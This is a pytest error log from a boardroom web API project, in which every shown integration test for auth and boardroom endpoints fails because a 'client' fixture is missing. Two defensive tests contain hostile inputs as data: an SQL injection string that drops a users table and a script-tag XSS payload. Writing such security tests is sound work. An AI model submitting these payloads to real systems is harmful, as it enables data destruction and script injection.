>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:255
____ ERROR at setup of TestAuthenticationFlow.test_multiple_login_attempts _____
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 305
      @patch('app.services.database.database_service')
      async def test_multiple_login_attempts(self, mock_db_service, client: AsyncClient):
          """Test multiple login attempts with rate limiting considerations."""
          mock_user = Mock()
          mock_user.email = "test@example.com"
          mock_user.hashed_password = "$2b$12$hashedpassword"
          mock_user.is_active = True
          mock_user.role = "user"

          mock_db_service.get_user_by_email.return_value = mock_user

          with patch('app.api.v1.auth.verify_password') as mock_verify, \
               patch('app.api.v1.auth.create_access_token') as mock_create_token:

              # First attempt - success
              mock_verify.return_value = True
              mock_token = Mock()
              mock_token.access_token = "success_token"
              mock_token.expires_at = "2023-12-31T23:59:59"
              mock_create_token.return_value = mock_token

              response1 = await client.post("/api/v1/auth/user-login", json={
                  "email": "test@example.com",
                  "password": "CorrectPassword123!"
              })
              assert response1.status_code == status.HTTP_200_OK

              # Second attempt - wrong password
              mock_verify.return_value = False

              response2 = await client.post("/api/v1/auth/user-login", json={
                  "email": "test@example.com",
                  "password": "WrongPassword123!"
              })
              assert response2.status_code == status.HTTP_401_UNAUTHORIZED

              # Third attempt - success again
              mock_verify.return_value = True

              response3 = await client.post("/api/v1/auth/user-login", json={
                  "email": "test@example.com",
                  "password": "CorrectPassword123!"
              })
              assert response3.status_code == status.HTTP_200_OK
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:305
__ ERROR at setup of TestAuthenticationSecurity.test_sql_injection_prevention __
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 355
      async def test_sql_injection_prevention(self, client: AsyncClient):
          """Test that SQL injection attempts are prevented."""
          # Attempt SQL injection in email field
          malicious_email = "'; DROP TABLE users; --"

          response = await client.post("/api/v1/auth/user-login", json={
              "email": malicious_email,
              "password": "password"
          })

          # Should be handled gracefully, not cause server error
          assert response.status_code in [status.HTTP_401_UNAUTHORIZED, status.HTTP_422_UNPROCESSABLE_ENTITY]
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:355
_ ERROR at setup of TestAuthenticationSecurity.test_xss_prevention_in_registration _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 368
      async def test_xss_prevention_in_registration(self, client: AsyncClient):
          """Test that XSS attempts in registration are sanitized."""
          malicious_name = "<script>alert('xss')</script>"

          response = await client.post("/api/v1/auth/register", json={
              "email": "xsstest@example.com",
              "username": "xsstest",
              "full_name": malicious_name,
              "password": "TestPassword123!",
              "role": "user"
          })

          # Should be rejected or sanitized
          assert response.status_code in [
              status.HTTP_422_UNPROCESSABLE_ENTITY,
              status.HTTP_400_BAD_REQUEST,
              status.HTTP_201_CREATED  # If sanitized and accepted
          ]

          if response.status_code == status.HTTP_201_CREATED:
              data = response.json()
              # Verify that malicious content was sanitized
              assert "<script>" not in data.get("full_name", "")
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:368
_ ERROR at setup of TestAuthenticationSecurity.test_password_not_returned_in_responses _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 392
      async def test_password_not_returned_in_responses(self, client: AsyncClient):
          """Test that passwords are never returned in API responses."""
          with patch('app.services.database.database_service') as mock_db_service:
              mock_user = Mock()
              mock_user.id = 1
              mock_user.email = "test@example.com"
              mock_user.username = "test"
              mock_user.full_name = "Test User"
              mock_user.role = "user"
              mock_user.is_active = True

              mock_db_service.get_user_by_email.return_value = None
              mock_db_service.create_user.return_value = mock_user

              with patch('app.api.v1.auth.get_password_hash'):
                  response = await client.post("/api/v1/auth/register", json={
                      "email": "test@example.com",
                      "username": "test",
                      "full_name": "Test User",
                      "password": "TestPassword123!",
                      "role": "user"
                  })

                  if response.status_code == status.HTTP_201_CREATED:
                      data = response.json()
                      assert "password" not in data
                      assert "hashed_password" not in data
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:392
_ ERROR at setup of TestAuthenticationSecurity.test_case_insensitive_email_handling _
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 420
      async def test_case_insensitive_email_handling(self, client: AsyncClient):
          """Test that email handling is case-insensitive."""
          with patch('app.services.database.database_service') as mock_db_service:
              mock_user = Mock()
              mock_user.email = "test@example.com"  # Stored in lowercase
              mock_user.hashed_password = "$2b$12$hashedpassword"
              mock_user.is_active = True
              mock_user.role = "user"

              mock_db_service.get_user_by_email.return_value = mock_user

              with patch('app.api.v1.auth.verify_password') as mock_verify, \
                   patch('app.api.v1.auth.create_access_token') as mock_create_token:

                  mock_verify.return_value = True
                  mock_token = Mock()
                  mock_token.access_token = "test_token"
                  mock_token.expires_at = "2023-12-31T23:59:59"
                  mock_create_token.return_value = mock_token

                  # Try login with uppercase email
                  response = await client.post("/api/v1/auth/user-login", json={
                      "email": "TEST@EXAMPLE.COM",
                      "password": "TestPassword123!"
                  })

                  # Should work regardless of case
                  assert response.status_code == status.HTTP_200_OK
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:420
__ ERROR at setup of TestAuthenticationRateLimiting.test_login_rate_limiting ___
file /home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py, line 454
      @pytest.mark.slow
      async def test_login_rate_limiting(self, client: AsyncClient):
          """Test that login attempts are rate limited."""
          # This test would need actual rate limiting to be implemented
          # For now, it's a placeholder to ensure the concept is tested

          login_data = {
              "email": "ratelimit@example.com",
              "password": "TestPassword123!"
          }

          # Make multiple rapid requests
          responses = []
          for i in range(10):
              response = await client.post("/api/v1/auth/user-login", json=login_data)
              responses.append(response.status_code)

          # At least some should succeed (or fail with auth errors)
          # If rate limiting is implemented, some should return 429
          success_or_auth_errors = [
              code for code in responses
              if code in [status.HTTP_200_OK, status.HTTP_401_UNAUTHORIZED]
          ]
          rate_limit_errors = [
              code for code in responses
              if code == status.HTTP_429_TOO_MANY_REQUESTS
          ]

          # Either no rate limiting (all auth attempts) or some rate limiting
          assert len(success_or_auth_errors) + len(rate_limit_errors) == len(responses)
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_auth_endpoints.py:454
____ ERROR at setup of TestBoardroomEndpoints.test_create_boardroom_success ____
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 19
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_create_boardroom_success(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test successful boardroom creation."""
          # Mock authentication
          mock_verify.return_value = "user-thread-123"

          # Mock user lookup
          mock_user = Mock()
          mock_user.id = 1
          mock_user.role = "admin"
          mock_db_service.get_user.return_value = mock_user

          # Mock boardroom creation
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.name = "Test Boardroom"
          mock_boardroom.description = "A test boardroom"
          mock_boardroom.owner_id = 1
          mock_boardroom.is_active = True
          mock_boardroom.settings = {"max_participants": 10}
          mock_db_service.create_boardroom.return_value = mock_boardroom

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.post("/api/v1/boardroom/", json={
              "name": "Test Boardroom",
              "description": "A test boardroom",
              "settings": {"max_participants": 10}
          }, headers=headers)

          assert response.status_code == status.HTTP_201_CREATED
          data = response.json()
          assert data["name"] == "Test Boardroom"
          assert data["description"] == "A test boardroom"
          assert data["owner_id"] == 1
          assert data["is_active"] is True
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:19
_ ERROR at setup of TestBoardroomEndpoints.test_create_boardroom_unauthorized __
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 56
      @patch('app.utils.auth.verify_token')
      async def test_create_boardroom_unauthorized(self, mock_verify, client: AsyncClient):
          """Test boardroom creation without authentication."""
          mock_verify.return_value = None  # Invalid token

          headers = {"Authorization": "Bearer invalid_token"}
          response = await client.post("/api/v1/boardroom/", json={
              "name": "Test Boardroom",
              "description": "A test boardroom"
          }, headers=headers)

          assert response.status_code == status.HTTP_401_UNAUTHORIZED
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:56
_ ERROR at setup of TestBoardroomEndpoints.test_create_boardroom_missing_token _
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 69
      async def test_create_boardroom_missing_token(self, client: AsyncClient):
          """Test boardroom creation without token."""
          response = await client.post("/api/v1/boardroom/", json={
              "name": "Test Boardroom",
              "description": "A test boardroom"
          })

          assert response.status_code == status.HTTP_401_UNAUTHORIZED
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:69
_ ERROR at setup of TestBoardroomEndpoints.test_create_boardroom_invalid_input _
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 78
      async def test_create_boardroom_invalid_input(self, client: AsyncClient):
          """Test boardroom creation with invalid input."""
          with patch('app.utils.auth.verify_token') as mock_verify:
              mock_verify.return_value = "user-thread-123"

              headers = {"Authorization": "Bearer valid_token"}

              # Test missing name
              response = await client.post("/api/v1/boardroom/", json={
                  "description": "A test boardroom"
              }, headers=headers)
              assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

              # Test empty name
              response = await client.post("/api/v1/boardroom/", json={
                  "name": "",
                  "description": "A test boardroom"
              }, headers=headers)
              assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:78
_____ ERROR at setup of TestBoardroomEndpoints.test_get_boardroom_success ______
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 98
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_get_boardroom_success(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test successful boardroom retrieval."""
          mock_verify.return_value = "user-thread-123"

          # Mock boardroom data
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.name = "Test Boardroom"
          mock_boardroom.description = "A test boardroom"
          mock_boardroom.owner_id = 1
          mock_boardroom.is_active = True
          mock_boardroom.settings = {"max_participants": 10}
          mock_boardroom.created_at = "2023-01-01T00:00:00"

          mock_db_service.get_boardroom.return_value = mock_boardroom

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.get("/api/v1/boardroom/board-123", headers=headers)

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["id"] == "board-123"
          assert data["name"] == "Test Boardroom"
          assert data["description"] == "A test boardroom"
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:98
____ ERROR at setup of TestBoardroomEndpoints.test_get_boardroom_not_found _____
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 125
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_get_boardroom_not_found(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test boardroom retrieval when boardroom doesn't exist."""
          mock_verify.return_value = "user-thread-123"
          mock_db_service.get_boardroom.return_value = None

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.get("/api/v1/boardroom/nonexistent", headers=headers)

          assert response.status_code == status.HTTP_404_NOT_FOUND
          data = response.json()
          assert "error" in data
          assert "not found" in data["error"]["message"].lower()
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:125
____ ERROR at setup of TestBoardroomEndpoints.test_list_boardrooms_success _____
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 140
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_list_boardrooms_success(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test successful boardroom listing."""
          mock_verify.return_value = "user-thread-123"

          # Mock user
          mock_user = Mock()
          mock_user.id = 1
          mock_db_service.get_user.return_value = mock_user

          # Mock boardrooms list
          mock_boardrooms = [
              Mock(id="board-1", name="Boardroom 1", owner_id=1, is_active=True),
              Mock(id="board-2", name="Boardroom 2", owner_id=1, is_active=True),
          ]
          mock_db_service.get_user_boardrooms.return_value = mock_boardrooms

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.get("/api/v1/boardroom/", headers=headers)

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert len(data) == 2
          assert data[0]["id"] == "board-1"
          assert data[1]["id"] == "board-2"
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:140
____ ERROR at setup of TestBoardroomEndpoints.test_update_boardroom_success ____
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 167
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_update_boardroom_success(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test successful boardroom update."""
          mock_verify.return_value = "user-thread-123"

          # Mock user
          mock_user = Mock()
          mock_user.id = 1
          mock_db_service.get_user.return_value = mock_user

          # Mock existing boardroom
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.name = "Old Name"
          mock_boardroom.description = "Old description"
          mock_boardroom.owner_id = 1
          mock_boardroom.is_active = True

          mock_db_service.get_boardroom.return_value = mock_boardroom
          mock_db_service.update_boardroom.return_value = mock_boardroom

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.put("/api/v1/boardroom/board-123", json={
              "name": "Updated Name",
              "description": "Updated description"
          }, headers=headers)

          assert response.status_code == status.HTTP_200_OK
          data = response.json()
          assert data["id"] == "board-123"
E       fixture 'client' not found
>       available fixtures: _class_event_loop, _function_event_loop, _module_event_loop, _package_event_loop, _session_event_loop, _session_faker, anyio_backend, anyio_backend_name, anyio_backend_options, api_response_factory, auth_token_factory, boardroom_factory, bulk_test_data, cache, capfd, capfdbinary, caplog, capsys, capsysbinary, class_mocker, cov, decision_factory, doctest_namespace, error_response_factory, event_loop, event_loop_policy, faker, free_tcp_port, free_tcp_port_factory, free_udp_port, free_udp_port_factory, load_test_duration, message_factory, mocker, module_mocker, monkeypatch, no_cover, package_mocker, performance_user_count, pytestconfig, realistic_test_scenario, record_property, record_testsuite_property, record_xml_attribute, recwarn, sample_boardroom_data, sample_session_data, sample_thread_data, sample_user_data, session_factory, session_mocker, set_test_environment, test_settings, testrun_uid, thread_factory, tmp_path, tmp_path_factory, tmpdir, tmpdir_factory, unused_tcp_port, unused_tcp_port_factory, unused_udp_port, unused_udp_port_factory, user_factory, worker_id
>       use 'pytest --fixtures [testpath]' for help on them.

/home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py:167
___ ERROR at setup of TestBoardroomEndpoints.test_update_boardroom_not_owner ___
file /home/paul/boardroom-repo/tests/integration/test_boardroom_endpoints.py, line 199
      @patch('app.services.database.database_service')
      @patch('app.utils.auth.verify_token')
      async def test_update_boardroom_not_owner(self, mock_verify, mock_db_service, client: AsyncClient):
          """Test boardroom update by non-owner."""
          mock_verify.return_value = "user-thread-123"

          # Mock user (not owner)
          mock_user = Mock()
          mock_user.id = 2
          mock_user.role = "user"
          mock_db_service.get_user.return_value = mock_user

          # Mock boardroom owned by different user
          mock_boardroom = Mock()
          mock_boardroom.id = "board-123"
          mock_boardroom.owner_id = 1  # Different owner
          mock_db_service.get_boardroom.return_value = mock_boardroom

          headers = {"Authorization": "Bearer valid_token"}
          response = await client.put("/api/v1/boardroom/board-123", json={
              "name": "Updated Name"
          }, headers=headers)

          assert response.status_code == status.HTTP_403_FORBIDDEN
E       fixture 'client' not found
